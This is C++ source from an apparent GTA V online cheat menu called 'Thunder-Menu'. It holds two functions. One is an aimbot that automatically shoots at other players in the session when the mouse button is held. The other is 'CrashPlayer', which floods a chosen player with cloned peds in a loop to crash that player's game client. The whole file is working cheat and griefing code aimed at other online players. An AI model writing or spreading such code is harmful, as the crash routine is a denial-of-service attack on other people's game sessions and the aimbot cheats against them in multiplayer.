void Features::aimbot(bool toggle)
{
	Player playerPed = PLAYER::PLAYER_PED_ID();
	if (aimbottoggle)
	{
		for (int i = 0; i < 32; i++)
		{
			Player playerHandle = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(i);
			char* Name = PLAYER::GET_PLAYER_NAME(PLAYER::INT_TO_PLAYERINDEX(i));
			if (ENTITY::DOES_ENTITY_EXIST(playerHandle))
			{
				if (playerHandle == playerPed) continue;
				{
					if (ENTITY::DOES_ENTITY_EXIST(PLAYER::PLAYER_PED_ID())
						&& ENTITY::HAS_ENTITY_CLEAR_LOS_TO_ENTITY(playerPed, playerHandle, 17)
						&& !PED::IS_PED_RUNNING_RAGDOLL_TASK(playerHandle)
						&& ENTITY::GET_ENTITY_ALPHA(playerHandle) == 255)
					{
						if (GetAsyncKeyState(0x01))
						{
							shootAtPed(playerHandle);
						}
					}
				}
			}
		}
	}
}

void Features::CrashPlayer(Player selectedPed)
{
	for (int i = 0; i <= 500; i++)
	{
		Ped playerPed = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(selectedPed);
		Player player = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(selectedPed);
		WAIT(20);
		try {
			PED::CLONE_PED(playerPed, 1, 1, 1);
			PED::CLONE_PED(playerPed, 1, 1, 1);
			PED::CLONE_PED(playerPed, 1, 1, 1);
			PED::CLONE_PED(playerPed, 1, 1, 1);
			PED::CLONE_PED(playerPed, 1, 1, 1);
		}
		catch (...) {
			return;
		}
		{
			if (i == 490)
			{
				break;
			}
			UI::_SET_NOTIFICATION_TEXT_ENTRY("STRING");
			UI::ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("~r~Stay away from this players");
			UI::_SET_NOTIFICATION_MESSAGE_CLAN_TAG_2("CHAR_STRIPPER_CHEETAH", "CHAR_STRIPPER_CHEETAH", 1, 8, "~w~Thunder-Menu\n", "~w~Clone Crash Player\r\n", 1, "~w~Thunder Menu\n ~w~Clone Crash Player\r\n", 9, 1);
			UI::_DRAW_NOTIFICATION_3(FALSE, FALSE);
		}
	}
}
